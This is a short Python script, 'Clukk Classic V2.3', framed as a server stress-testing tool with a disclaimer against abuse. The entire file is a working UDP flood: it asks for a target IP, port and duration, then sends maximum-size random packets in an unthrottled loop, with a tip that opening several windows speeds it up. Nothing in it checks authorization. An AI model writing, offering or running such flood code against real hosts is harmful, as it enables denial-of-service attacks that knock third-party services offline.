import socket
import random
import time

print("""
                Clukk
             Classic V2.3
""")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("We do not want any trouble because of abusers, please use this testing tool for testing or educational purposes.")
print("")
print("Clukk Details:")
print("")
print("""
Clukk Classic V2.3
Creator: BSP/IOD
Purpose: Stress testing
for server owners and
authorized testers.
""")
print("")
print("Multiple windows can be opened for a slight increase in speed.")
print("")

bytes = random._urandom(65507)

print("Use the url2ip.py tool to resolve the hostname.")
ip = input('IP: ')
port = int(input('Port: '))

print("Use the hour2second.py tool to convert hours to seconds.")
duration = input('Test time in seconds: ')
print("")

timeout = time.time() + float(duration)
sent = 0



while True:

	if time.time() > timeout:

		break

	else:

		pass

	sock.sendto(bytes,(ip, port))

	sent = sent + 1
	print("-- Clukk: Packet #%s was sent to address %s on port %s."%(sent, ip, port))
